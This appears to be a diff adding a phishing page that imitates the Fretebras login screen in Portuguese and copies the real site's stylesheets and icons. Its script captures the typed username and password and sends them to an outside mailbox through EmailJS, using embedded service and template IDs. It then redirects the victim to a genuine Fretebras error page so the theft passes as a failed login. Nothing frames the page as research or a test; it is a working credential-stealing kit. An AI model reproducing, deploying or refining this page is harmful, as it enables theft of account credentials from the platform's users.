@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html class="" lang="pt-BR">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="authcedd.css">
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>
+    Entrar em Fretebras
+  </title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/foundation-sites@6.9.0/dist/css/foundation.min.css"
+    crossorigin="anonymous">
+  <link rel="stylesheet" href="node_modules/@fuel-ui/core/dist/fuel-ui/fuel-ui.css">
+  <link rel="icon" href="https://sso-external.fretebras.com.br/resources/wmdp9/login/fretebras/img/favicon.svg" />
+  <link href="https://sso-external.fretebras.com.br/resources/wmdp9/login/fretebras/css/styles.css" rel="stylesheet" />
+  <link
+    href="https://sso-external.fretebras.com.br/resources/wmdp9/login/fretebras/node_modules/@frete.com/fuel-foundation/fretebras/_variables.css"
+    rel="stylesheet" />
+  <link
+    href="https://sso-external.fretebras.com.br/resources/wmdp9/login/fretebras/node_modules/@frete.com/fuel-components/dist/collection/components/text-field/text-field.css"
+    rel="stylesheet" />
+  <link
+    href="https://sso-external.fretebras.com.br/resources/wmdp9/login/fretebras/node_modules/@frete.com/fuel-components/dist/collection/components/callout/callout.css"
+    rel="stylesheet" />
+</head>
+
+<body class="">
+  <div class="">
+    <div id="kc-header" class="">
+      <div id="kc-header-wrapper" class="">
+        <div class="kc-logo-text"><span>Fretebras</span></div>
+      </div>
+    </div>
+    <div class="">
+      <header class="">
+        <h1 id="kc-page-title"></h1>
+      </header>
+      <div id="kc-content">
+        <div id="kc-content-wrapper">
+          <div class="callout callout--hide">
+            <div class="callout__icon-container">
+              <span data-callout-icon></span>
+            </div>
+            <div class="callout__content">
+              <fuel-typography class="callout__title" tag="h3" weight="bold" displayInline>
+                <span data-callout-title></span>
+              </fuel-typography>
+              <fuel-typography class="callout__message" size="caption" weight="medium">
+                <span data-callout-message></span>
+              </fuel-typography>
+            </div>
+          </div>
+          <h3
+            class="form-title
+            typography typography--heading typography--heading-lg typography--neutral-strong sc-fuel-typography sc-fuel-typography-s"
+            style="margin: 0px;">
+            <strong>Bem-vindo!</strong> Acesse sua conta
+          </h3>
+          <div id="kc-form">
+            <div id="kc-form-wrapper">
+              <form 
+                id="kc-form-login" 
+                class="js-form" onsubmit="login.disabled = true; return true;"
+              >
+                <div class="text-field text-field--large sc-fuel-text-field">
+                  <label part="label" class="text-field__label sc-fuel-text-field" for="username">
+                    Nome de usuário ou e-mail
+                  </label>
+                  <div class="text-field__wrapper sc-fuel-text-field">
+                    <input part="input" class="text-field__input sc-fuel-text-field" id="username"
+                      placeholder="Digite seu usuário ou e-mail" name="username" type="text" autocomplete="off">
+                  </div>
+                </div>
+                <div class="text-field text-field--large sc-fuel-text-field">
+                  <label part="label" class="text-field__label sc-fuel-text-field" for="password">
+                    Senha
+                  </label>
+                  <div class="text-field__wrapper sc-fuel-text-field">
+                    <input class="text-field__input sc-fuel-text-field" id="password"
+                      placeholder="Digite sua senha" name="password" type="password" autocomplete="off">
+                  </div>
+                </div>
+                <div class=" " style="">
+                  <div class="form-checkbox">
+
+                    <input id="checkbox" type="checkbox" class="rememberMe-checkbox">
+                    <label for="checkbox" class="rememberMe-label sc-fuel-checkbox" part="label">
+                      Mantenha-me conectado
+                    </label>
+                  </div>
+                  <div class="">
+                    <a
+                      href="#"
+                      class="reset-credentials-link">
+                      Esqueceu sua senha?
+                    </a>
+                  </div>
+                  <button class="login-button" type="button" onclick="sendMail()" id="login-button" disabled>
+                    Entrar
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginButton = document.getElementById('login-button');
+
+    function checkInputs() {
+      if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+        loginButton.disabled = false;
+      } else {
+        loginButton.disabled = true;      }
+    }
+
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+  </script>
+
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  
+  <script>
+    emailjs.init("8FCtX9CcDWT-jqftw");
+
+    function sendMail() {
+      let params = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value
+      }
+
+      emailjs.send("service_h2zjuxv", "template_qd93z53", params)
+        .then(function(response) {
+          window.location.href = 'https://error-pages.fretebras.com.br/errors/400.html'
+        }, function(error) {
+          window.location.href = 'https://error-pages.fretebras.com.br/errors/400.html'
+        });    
+    }
+  </script>
+</body>
+</html>
+
